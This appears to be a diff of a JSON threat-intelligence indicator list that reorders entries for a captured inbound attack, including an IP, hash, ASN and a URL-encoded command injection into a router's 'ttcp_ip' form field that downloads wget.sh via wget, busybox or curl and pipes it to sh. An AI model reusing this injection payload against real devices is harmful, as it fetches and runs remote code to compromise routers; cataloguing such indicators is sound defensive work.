@@ -1,5 +1,11 @@
 [
   {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20lunblk%3Bbusybox%20wget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20lunblk%3Bcurl%20http://91.92.40.XXX/wget.sh%7Csh%20-s%20lunblk%60&submit_button=&change_action=&action=&commit=0&ttcp_num=2&ttcp_size=2&StartEPI=1"
+  },
+  {
     "context": "Embedded IP in inbound payload",
     "source": "static_analysis",
     "type": "ip",
@@ -12,22 +18,16 @@
     "value": "91.92.40.XXX"
   },
   {
-    "context": "Embedded URL in inbound payload",
+    "context": "Suspicious command in inbound payload",
     "source": "strings",
-    "type": "url",
-    "value": "hxxp://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20lunblk%3Bbusybox%20wget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20lunblk%3Bcurl%20http://91.92.40.XXX/wget.sh%7Csh%20-s%20lunblk%60&submit_button=&change_action=&action=&commit=0&ttcp_num=2&ttcp_size=2&StartEPI=1"
+    "type": "command",
+    "value": "ttcp_ip=-h%20%60cd%20/tmp%3Bwget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20lunblk%3Bbusybox%20wget%20http://91.92."
   },
   {
     "context": "Inbound payload hash (unknown)",
     "source": "static_analysis",
     "type": "hash",
     "value": "87b3e6dc0282532227abe0fbce21f868ace870c08a08134e245a92d7bb05d6d3"
-  },
-  {
-    "context": "Suspicious command in inbound payload",
-    "source": "strings",
-    "type": "command",
-    "value": "ttcp_ip=-h%20%60cd%20/tmp%3Bwget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20lunblk%3Bbusybox%20wget%20http://91.92."
   },
   {
     "asn": "TechTies Inc.",
